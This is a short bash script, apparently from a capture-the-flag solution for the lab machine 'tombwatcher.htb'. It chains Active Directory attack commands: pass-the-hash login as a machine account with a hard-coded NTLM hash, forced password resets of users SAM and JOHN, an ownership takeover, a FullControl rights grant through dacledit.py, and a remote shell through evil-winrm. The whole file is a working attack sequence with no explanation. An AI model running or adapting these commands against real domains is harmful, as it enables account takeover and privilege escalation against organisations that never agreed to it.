#! /bin/bash
bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u 'ANSIBLE_DEV$' -p :7bc5a56af89da4d3c03bc048055350f2 set password SAM "newP@ssword2025"
bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u SAM -p "newP@ssword2025" set owner JOHN SAM
dacledit.py -action 'write' -rights 'FullControl' -principal 'SAM' -target 'JOHN' 'tombwatcher.htb'/'SAM':'newP@ssword2025'
bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u 'SAM' -p 'newP@ssword2025' set password JOHN "newP@ssword2025"
evil-winrm-py -i 10.10.11.72 -u JOHN -p "newP@ssword2025"
